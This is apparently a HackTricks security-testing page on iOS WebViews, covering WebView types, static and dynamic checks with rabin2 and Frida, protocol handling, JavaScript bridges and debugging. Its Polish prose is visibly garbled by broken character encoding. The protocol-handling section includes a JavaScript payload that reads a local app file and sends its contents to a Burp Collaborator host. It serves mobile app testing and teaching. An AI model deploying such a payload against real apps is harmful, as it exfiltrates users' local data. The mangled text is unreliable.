# iOS WebViews

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The code of this page was extracted from [here](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Check the page for further details.


## WebViews types

WebViews s wykorzystywane w aplikacjach do interaktywnego wywietlania treci internetowych. R贸偶ne typy WebViews oferuj r贸偶ne funkcjonalnoci i cechy bezpieczestwa dla aplikacji iOS. Oto kr贸tki przegld:

- **UIWebView**, kt贸ry nie jest ju偶 zalecany od iOS 12 z powodu braku wsparcia dla wyczania **JavaScript**, co czyni go podatnym na wstrzykiwanie skrypt贸w i ataki **Cross-Site Scripting (XSS)**.

- **WKWebView** jest preferowan opcj do wczania treci internetowych w aplikacjach, oferujc lepsz kontrol nad treci i funkcjami bezpieczestwa. **JavaScript** jest domylnie wczony, ale mo偶na go wyczy, jeli zajdzie taka potrzeba. Obsuguje r贸wnie偶 funkcje zapobiegajce automatycznemu otwieraniu okien przez JavaScript i zapewnia, 偶e wszystkie treci s adowane w spos贸b bezpieczny. Dodatkowo architektura **WKWebView** minimalizuje ryzyko uszkodzenia pamici wpywajcego na g贸wny proces aplikacji.

- **SFSafariViewController** oferuje ustandaryzowane dowiadczenie przegldania internetu w aplikacjach, rozpoznawalne dziki specyficznemu ukadowi, w tym polu adresowym tylko do odczytu, przyciskom udostpniania i nawigacji oraz bezporedniemu linkowi do otwierania treci w Safari. W przeciwiestwie do **WKWebView**, **JavaScript** nie mo偶e by wyczony w **SFSafariViewController**, kt贸ry r贸wnie偶 dzieli pliki cookie i dane z Safari, zachowujc prywatno u偶ytkownika przed aplikacj. Musi by wywietlany w spos贸b wyra藕ny zgodnie z wytycznymi App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

W procesie badania konfiguracji **WebViews** skupiamy si na dw贸ch g贸wnych typach: **UIWebView** i **WKWebView**. Aby zidentyfikowa te WebViews w binarnym pliku, wykorzystuje si polecenia, kt贸re wyszukuj konkretne odniesienia do klas i metody inicjalizacji.

- **UIWebView Identification**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
To polecenie pomaga w lokalizowaniu instancji **UIWebView** poprzez wyszukiwanie cig贸w tekstowych zwizanych z nim w binarnym.

- **Identyfikacja WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Podobnie, dla **WKWebView**, to polecenie przeszukuje binarny plik w poszukiwaniu cig贸w tekstowych wskazujcych na jego u偶ycie.

Ponadto, aby znale藕, jak **WKWebView** jest inicjowany, wykonuje si nastpujce polecenie, celujc w sygnatur metody zwizan z jego inicjalizacj:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Weryfikacja konfiguracji JavaScript**

Dla **WKWebView** podkrela si, 偶e wyczenie JavaScriptu jest najlepsz praktyk, chyba 偶e jest to wymagane. Przeszukuje si skompilowany plik binarny, aby potwierdzi, 偶e waciwo `javaScriptEnabled` jest ustawiona na `false`, co zapewnia, 偶e JavaScript jest wyczony:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Tylko Weryfikacja Zawartoci Bezpieczestwa**

**WKWebView** oferuje mo偶liwo identyfikacji problem贸w z mieszanym contentem, w przeciwiestwie do **UIWebView**. Jest to sprawdzane za pomoc waciwoci `hasOnlySecureContent`, aby upewni si, 偶e wszystkie zasoby strony s adowane przez bezpieczne poczenia. Wyszukiwanie w skompilowanym binarnym pliku jest przeprowadzane w nastpujcy spos贸b:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Wnioski z analizy dynamicznej**

Analiza dynamiczna polega na inspekcji sterty w poszukiwaniu instancji WebView i ich waciwoci. W tym celu u偶ywany jest skrypt o nazwie `webviews_inspector.js`, kt贸ry celuje w instancje `UIWebView`, `WKWebView` i `SFSafariViewController`. Rejestruje on informacje o znalezionych instancjach, w tym adresy URL oraz ustawienia zwizane z JavaScript i zabezpieczon zawartoci.

Inspekcj sterty mo偶na przeprowadzi za pomoc `ObjC.choose()`, aby zidentyfikowa instancje WebView i sprawdzi waciwoci `javaScriptEnabled` oraz `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Skrypt jest wykonywany za pomoc:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Kluczowe wyniki**:
- Instancje WebViews s skutecznie lokalizowane i badane.
- Weryfikowane s ustawienia wczenia JavaScript i zabezpiecze treci.

To podsumowanie obejmuje kluczowe kroki i polecenia zwizane z analizowaniem konfiguracji WebView za pomoc podej statycznych i dynamicznych, koncentrujc si na funkcjach zabezpiecze, takich jak wczenie JavaScript i wykrywanie mieszanej treci.

## Obsuga protoko贸w WebView

Obsuga treci w WebViews jest kluczowym aspektem, szczeg贸lnie w przypadku r贸偶nych protoko贸w, takich jak `http(s)://`, `file://` i `tel://`. Te protokoy umo偶liwiaj adowanie zar贸wno zdalnych, jak i lokalnych treci w aplikacjach. Podkrela si, 偶e podczas adowania lokalnych treci nale偶y podj rodki ostro偶noci, aby zapobiec wpywowi u偶ytkownik贸w na nazw lub cie偶k pliku oraz na edytowanie samej treci.

**WebViews** oferuj r贸偶ne metody adowania treci. Dla **UIWebView**, obecnie przestarzaego, u偶ywane s metody takie jak `loadHTMLString:baseURL:` i `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView** z kolei wykorzystuje `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` oraz `loadRequest:` do treci internetowych. Metody takie jak `pathForResource:ofType:`, `URLForResource:withExtension:` i `init(contentsOf:encoding:)` s zazwyczaj wykorzystywane do adowania lokalnych plik贸w. Metoda `loadFileURL:allowingReadAccessToURL:` jest szczeg贸lnie godna uwagi ze wzgldu na swoj zdolno do adowania konkretnego URL lub katalogu do WebView, co potencjalnie mo偶e ujawnia wra偶liwe dane, jeli okrelony jest katalog.

Aby znale藕 te metody w kodzie 藕r贸dowym lub skompilowanej binarnej, mo偶na u偶y polece takich jak poni偶sze:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Jeli chodzi o **dostp do plik贸w**, UIWebView pozwala na to uniwersalnie, podczas gdy WKWebView wprowadza ustawienia `allowFileAccessFromFileURLs` i `allowUniversalAccessFromFileURLs` do zarzdzania dostpem z adres贸w URL plik贸w, przy czym oba s domylnie ustawione na false.

Przykad skryptu Frida jest podany, aby sprawdzi konfiguracje **WKWebView** dla ustawie bezpieczestwa:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Na koniec, przykad adunku JavaScript majcego na celu eksfiltracj lokalnych plik贸w ilustruje potencjalne ryzyko bezpieczestwa zwizane z niewaciwie skonfigurowanymi WebView. Ten adunek koduje zawarto plik贸w w formacie szesnastkowym przed przesaniem ich na serwer, podkrelajc znaczenie rygorystycznych rodk贸w bezpieczestwa w implementacjach WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Metody natywne udostpnione przez WebViews

## Zrozumienie natywnych interfejs贸w WebView w iOS

Od iOS 7 Apple udostpnio API do **komunikacji midzy JavaScript w WebView a natywnymi** obiektami Swift lub Objective-C. Ta integracja jest g贸wnie uatwiana przez dwie metody:

- **JSContext**: Funkcja JavaScript jest automatycznie tworzona, gdy blok Swift lub Objective-C jest powizany z identyfikatorem w `JSContext`. Umo偶liwia to pynne poczenie i komunikacj midzy JavaScript a kodem natywnym.
- **Protok贸 JSExport**: Poprzez dziedziczenie protokou `JSExport`, natywne waciwoci, metody instancji i metody klasowe mog by udostpniane JavaScript. Oznacza to, 偶e wszelkie zmiany wprowadzone w rodowisku JavaScript s odzwierciedlane w rodowisku natywnym i odwrotnie. Jednak wa偶ne jest, aby upewni si, 偶e wra偶liwe dane nie s przypadkowo ujawniane za pomoc tej metody.

### Uzyskiwanie dostpu do `JSContext` w Objective-C

W Objective-C `JSContext` dla `UIWebView` mo偶na uzyska za pomoc nastpujcej linii kodu:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Komunikacja z `WKWebView`

Dla `WKWebView` bezporedni dostp do `JSContext` nie jest dostpny. Zamiast tego, wykorzystywane jest przesyanie wiadomoci za pomoc funkcji `postMessage`, co umo偶liwia komunikacj JavaScript z natywn aplikacj. Obsugiwacze tych wiadomoci s ustawiane w nastpujcy spos贸b, co umo偶liwia JavaScript interakcj z natywn aplikacj w spos贸b bezpieczny:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interakcja i Testowanie

JavaScript mo偶e interagowa z warstw natywn, definiujc handler wiadomoci skryptu. Umo偶liwia to operacje takie jak wywoywanie funkcji natywnych z strony internetowej:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Aby przechwyci i manipulowa wynikiem wywoania funkcji natywnej, mo偶na nadpisa funkcj zwrotn w HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Strona natywna obsuguje wywoanie JavaScript, jak pokazano w klasie `JavaScriptBridgeMessageHandler`, gdzie wynik operacji, takich jak mno偶enie liczb, jest przetwarzany i wysyany z powrotem do JavaScript w celu wywietlenia lub dalszej manipulacji:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugging iOS WebViews

(Tutorial oparty na tym z [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Aby skutecznie debugowa treci internetowe w iOS webviews, wymagane jest specyficzne ustawienie z wykorzystaniem narzdzi dewelopera Safari, poniewa偶 wiadomoci wysyane do `console.log()` nie s wywietlane w logach Xcode. Oto uproszczony przewodnik, podkrelajcy kluczowe kroki i wymagania:

- **Przygotowanie na urzdzeniu iOS**: Nale偶y aktywowa Web Inspector w Safari na swoim urzdzeniu iOS. Mo偶na to zrobi, przechodzc do **Ustawienia > Safari > Zaawansowane** i wczajc _Web Inspector_.

- **Przygotowanie na urzdzeniu macOS**: Na swoim komputerze deweloperskim macOS musisz wczy narzdzia dewelopera w Safari. Uruchom Safari, przejd藕 do **Safari > Preferencje > Zaawansowane** i wybierz opcj _Poka偶 menu Rozw贸j_.

- **Poczenie i debugowanie**: Po podczeniu urzdzenia iOS do komputera macOS i uruchomieniu aplikacji, u偶yj Safari na swoim urzdzeniu macOS, aby wybra webview, kt贸re chcesz debugowa. Przejd藕 do _Rozw贸j_ w pasku menu Safari, najed藕 na nazw swojego urzdzenia iOS, aby zobaczy list instancji webview, a nastpnie wybierz instancj, kt贸r chcesz zbada. Otworzy si nowe okno Safari Web Inspector w tym celu.

Jednak pamitaj o ograniczeniach:

- Debugowanie t metod wymaga urzdzenia macOS, poniewa偶 opiera si na Safari.
- Tylko webviews w aplikacjach zaadowanych na twoje urzdzenie przez Xcode s kwalifikowane do debugowania. Webviews w aplikacjach zainstalowanych przez App Store lub Apple Configurator nie mog by debugowane w ten spos贸b.


## References

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
